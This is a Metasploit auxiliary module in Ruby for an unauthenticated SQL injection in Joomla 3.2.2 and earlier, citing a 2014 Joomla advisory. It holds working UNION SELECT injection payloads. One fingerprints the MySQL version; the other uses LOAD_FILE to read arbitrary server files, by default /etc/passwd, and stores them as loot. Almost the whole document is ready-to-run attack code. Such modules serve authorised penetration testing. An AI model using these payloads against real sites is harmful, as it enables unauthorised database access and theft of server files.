##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla weblinks-categories Unauthenticated SQL Injection Arbitrary File Read',
      'Description'    => %q{
      Joomla versions 3.2.2 and below are vulnerable to an unauthenticated SQL injection
      which allows an attacker to access the database or read arbitrary files as the
      'mysql' user. This module will only work if the mysql user Joomla is using
      to access the database has the LOAD_FILE permission.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>', #metasploit module
        ],
      'References'     =>
        [
          ['EDB', '31459'],
          ['URL', 'http://developer.joomla.org/security/578-20140301-core-sql-injection.html']
        ],
      'DisclosureDate' => 'Mar 2 2014'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Joomla directory path", '/']),
        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"]),
        OptInt.new('CATEGORYID', [true, "The category ID to use in the SQL injection", 0])
      ], self.class)

  end

  def check

    front_marker = Rex::Text.rand_text_alpha(6)
    back_marker = Rex::Text.rand_text_alpha(6)

    payload = datastore['CATEGORYID'].to_s
    payload << ") UNION ALL SELECT CONCAT(0x#{front_marker.unpack('H*')[0]},"
    payload << "IFNULL(CAST(VERSION() "
    payload << "AS CHAR),0x20),0x#{back_marker.unpack('H*')[0]})#"

    resp = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php', 'weblinks-categories'),
      'vars_get' => {
        'id' => payload
      }
    })

    if !resp or !resp.body
      return Exploit::CheckCode::Safe
    end

    if resp.body =~ /404<\/span> Category not found/
      return Exploit::CheckCode::Unknown
    end

    version = /#{front_marker}(.*)#{back_marker}/.match(resp.body)

    if !version
      return Exploit::CheckCode::Safe
    end

    version = version[1].gsub(front_marker, '').gsub(back_marker, '')
    print_good("Fingerprinted: #{version}")
    return Exploit::CheckCode::Vulnerable
  end

  def run
    front_marker = Rex::Text.rand_text_alpha(6)
    back_marker = Rex::Text.rand_text_alpha(6)
    file = datastore['FILEPATH'].unpack("H*")[0]
    catid = datastore['CATEGORYID']

    payload = catid.to_s
    payload << ") UNION ALL SELECT CONCAT(0x#{front_marker.unpack('H*')[0]}"
    payload << ",IFNULL(CAST(HEX(LOAD_FILE("
    payload << "0x#{file})) AS CHAR),0x20),0x#{back_marker.unpack('H*')[0]})#"

    resp = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php', 'weblinks-categories'),
      'vars_get' => {
        'id' => payload
      }
    })

    if !resp or !resp.body
      fail_with("Server did not respond in an expected way. Verify the IP address.")
    end

    if resp.body =~ /404<\/span> Category not found/
      fail_with("The category ID was invalid. Please try again with a valid category ID")
    end

    file = /#{front_marker}(.*)#{back_marker}/.match(resp.body)

    if !file
      fail_with("Either the file didn't exist or the server has been patched.")
    end

    file = file[1].gsub(front_marker, '').gsub(back_marker, '')
    file = [file].pack("H*")

    if file == '' or file == "\x00"
      fail_with("Either the file didn't exist or the database user does not have LOAD_FILE permissions")
    end

    path = store_loot("joomla.file", "text/plain", datastore['RHOST'], file, datastore['FILEPATH'])

    if path and path != ''
      print_good("File saved to: #{path}")
    end
  end
end

